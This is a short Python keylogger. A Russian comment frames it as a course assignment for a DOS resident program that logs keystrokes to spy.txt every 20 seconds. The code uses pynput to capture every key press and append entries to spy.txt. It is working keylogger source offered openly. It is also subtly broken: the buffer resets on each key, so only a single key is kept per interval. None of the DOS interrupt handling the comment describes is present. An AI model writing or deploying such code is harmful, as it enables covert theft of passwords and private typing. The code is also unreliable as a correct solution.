# Запрограммировать клавиатурный шпион. Данная программа должна накапливать у себя в 
# памяти вводимые пользователем символы и с заданной периодичностью (например 20 с.) 
# сохранять их в файл spy.txt. Перехватываемые прерывания – клавиатура и таймер.
# Должна быть обязательная проверка занятости DOS и данные должны сохраняться только 
# когда система свободна. Должны быть решены проблемы повторного вхождения в прерывания DOS. 
# Должна быть реализована возможность корректного удаления обработчика (допустимо не удалять 
# резидент полностью, а заменять обработчик заглушкой). Должна также выполняться проверка 
# повторной установки (предлагается использовать при помощи мультиплексного прерывания).

import logging
import time
from pynput.keyboard import Key, Listener


run_time = time.time()
period = 20

log_file = "spy.txt"

logging.basicConfig(
    filename=log_file,
    filemode='a',
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)


def on_press(key):
    global run_time
    text = ""
    text += str(key)

    if time.time() - run_time >= period:
        run_time = time.time()
        logging.info(" ".join(text))
        text = ""


def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()